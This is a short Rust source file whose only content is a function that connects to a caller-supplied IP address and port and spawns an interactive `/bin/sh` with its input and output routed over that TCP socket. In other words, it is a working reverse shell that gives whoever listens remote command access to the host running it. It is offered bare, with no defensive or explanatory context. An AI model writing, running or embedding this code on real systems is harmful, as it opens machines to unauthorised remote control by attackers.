use std::net::TcpStream;
use std::os::unix::io::OwnedFd;
use std::process::{Command, Stdio};

pub fn shell(ip: &str, port: u16) {
    let ip_port = format!("{ip}:{port}");

    // Make a TCP stream connection
    let stream = TcpStream::connect(ip_port).unwrap();

    // Use the stream as a file descriptor for sending stdin/stdout/stderr
    let fd = OwnedFd::from(stream);

    // Open shell and set the file descriptor for stdin/stdout/stderr to the stream's file descriptor
    Command::new("/bin/sh")
        .arg("-i")
        .stdin( Stdio::from(fd.try_clone().unwrap()) )
        .stdout( Stdio::from(fd.try_clone().unwrap()) )
        .stderr( Stdio::from(fd) )
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
